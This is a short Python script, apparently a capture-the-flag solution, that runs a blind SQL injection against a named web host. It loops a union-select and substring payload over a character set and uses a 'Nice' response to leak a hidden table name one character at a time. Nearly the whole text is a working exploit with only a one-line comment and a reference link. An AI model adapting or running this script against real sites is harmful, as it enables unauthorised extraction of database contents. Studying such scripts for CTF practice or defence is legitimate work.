import requests
import string

"""
First step is to leak the table name.

Reference: https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952
"""

payload = "' or '1'='1' union select 1,2,3 from referers where BINARY '{}' = substring((select `2` from (select 1,2,3 union select * from referers)a limit 1,1),1,{}) limit 1,1;--+"


ans = ''
j = len(ans) + 1
while True:
    for i in '_{}' + string.ascii_lowercase + '0123456789':
        char = i
        p = payload.format(char, j)
        print(p)
        r = requests.get("http://safehouse.darkarmy.xyz/?xer="+p)
        if 'Nice' in r.text:
            print(char)
            ans += char
            break
        print("Flag ", ans)
    j += 1
